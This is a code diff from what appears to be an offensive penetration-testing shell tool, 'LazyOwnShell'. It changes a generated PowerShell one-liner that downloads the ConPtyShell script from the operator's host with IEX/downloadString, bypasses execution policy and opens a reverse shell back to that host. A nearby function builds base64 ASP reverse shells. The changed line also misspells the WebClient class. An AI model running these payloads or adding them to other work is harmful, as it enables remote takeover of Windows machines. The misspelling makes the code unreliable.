@@ -1588,7 +1588,7 @@ class LazyOwnShell(Cmd):
             return
 
         os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip")
-        cmd = f"""iwr -uri http://{lhost}/Invoke-ConPtyShell.ps1 -OutFile Invoke-ConPtyShell.ps1 ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell.ps1 {lhost} {lport}'"""
+        cmd = f"""IEX(New-Object New.WebClient).downloadString('http://{lhost}/Invoke-ConPtyShell.ps1') ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell.ps1 -RemoteIp {lhost} -RemotePort {lport} -Rows 24 -Cols 135'"""
         os.system(f"echo '{cmd}' |  xclip -sel clip")
         print(f"    {GREEN}[+]{cmd} {YELLOW} Copied to clipboard :D {RESET}")
         return
@@ -1833,7 +1833,7 @@ class LazyOwnShell(Cmd):
         print_msg(f'Try... echo -n"IEX(New-Object New.WebClient).downloadString(\'http://{lhost}/{line}\')" | iconv -t utf-16le | base64')
         print_msg('copied to clipboard')
         return
-        
+
     def do_asprevbase64(self, line):
         """ create a base64 rev shell in asp, you need pass the base64 encodd payload, see help winbase64payload to create the payload base64 encoded """
         if not line:
